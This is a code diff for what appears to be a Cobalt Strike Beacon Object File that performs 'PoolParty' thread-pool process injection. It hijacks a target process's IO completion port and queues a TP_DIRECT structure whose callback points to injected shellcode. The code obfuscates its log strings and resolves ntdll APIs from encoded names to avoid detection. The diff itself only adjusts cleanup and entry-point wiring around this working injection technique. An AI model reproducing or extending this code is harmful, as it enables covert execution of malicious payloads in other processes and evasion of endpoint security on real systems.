@@ -16,10 +16,15 @@ static const unsigned char kFmtV7Wrote[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89,
 static const unsigned char kFmtV7Queue[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF6, 0x49, 0xF4, 0x2B, 0x4E, 0xB0, 0x48, 0x90, 0x87, 0x4C, 0xF0, 0x3D, 0x40, 0xB1, 0x1C, 0xD1, 0xD3, 0x53, 0xB1, 0x2A, 0x43, 0xB1, 0x48, 0xB8, 0xE8, 0x1C, 0xF2, 0x31, 0x46, 0xA4, 0x04, 0x94, 0xD3, 0x55, 0xFE, 0x30, 0x0B, 0xA4, 0x07, 0x83, 0xD3, 0x1C, 0xFE, 0x38, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B, 0xD1, 0xD0, 0x53, 0xE3, 0x35, 0x4E, 0xA6, 0x48, 0x97, 0xC6, 0x5F, 0xE5, 0x31, 0x59, 0xAD, 0x68 };
 // "[INFO] \tQueued a packet to the IO completion port of the target process worker factory"
 
+static BOOL VariantSanityExtra(void) {
+    return TRUE;
+}
+
 static BOOL RemoteTpDirectInsertionSetupExecution() {
     _ZwSetIoCompletion ZwSetIoCompletion;
     TP_DIRECT Direct;
     PTP_DIRECT RemoteDirectAddress;
+    BOOL posted;
 
     ZwSetIoCompletion = (_ZwSetIoCompletion)ResolveNtdllEnc(kApiZwSetIoCompletion, (int)sizeof(kApiZwSetIoCompletion));
     if (ZwSetIoCompletion == NULL) {
@@ -28,6 +33,8 @@ static BOOL RemoteTpDirectInsertionSetupExecution() {
     }
 
     MSVCRT$memset(&Direct, 0, sizeof(Direct));
+    Direct.Callback = m_ShellcodeAddress;
+    SanitizeTpDirect(&Direct);
     Direct.Callback = m_ShellcodeAddress;
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV7Craft);
 
@@ -47,11 +54,13 @@ static BOOL RemoteTpDirectInsertionSetupExecution() {
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV7Wrote);
     ApiPause();
 
-    if (!NT_SUCCESS(ZwSetIoCompletion(m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0))) {
+    posted = NT_SUCCESS(ZwSetIoCompletion(m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0));
+    if (!posted) {
         RemoteFree(RemoteDirectAddress);
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
     }
+    MarkPublished();
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV7Queue);
     ApiPause();
     return TRUE;
@@ -60,7 +69,7 @@ static BOOL RemoteTpDirectInsertionSetupExecution() {
 void HijackHandles() {
     m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid);
     if (m_p_hIoCompletion != NULL) {
-        OBF_PRINT1(CALLBACK_OUTPUT, kFmtHijackIocp, m_p_hIoCompletion);
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtHijackIocp);
     }
 }
 
@@ -79,6 +88,7 @@ void Inject() {
         return;
     }
     if (!RemoteTpDirectInsertionSetupExecution()) {
+        FreeShellcodeIfUnpublished();
         CloseHandleSafe(&m_p_hIoCompletion);
         InjectCleanup();
         return;
@@ -89,8 +99,5 @@ void Inject() {
 }
 
 void go(char * args, int len) {
-    if (!ParseBeaconArgs(args, len)) {
-        return;
-    }
-    Inject();
+    PoolPartyEntry(args, len);
 }
